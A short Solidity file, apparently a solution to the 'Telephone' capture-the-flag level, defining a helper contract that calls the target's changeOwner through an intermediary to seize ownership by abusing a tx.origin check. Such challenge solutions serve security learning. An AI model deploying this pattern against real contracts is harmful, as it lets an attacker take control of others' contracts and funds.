// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Telephone.sol";

contract TelephoneHelper {
  Telephone telephone;

  constructor(address teleAddr) public {
    telephone = Telephone(teleAddr);
  }

  function takeOwnership() public {
    telephone.changeOwner(msg.sender);
  }
}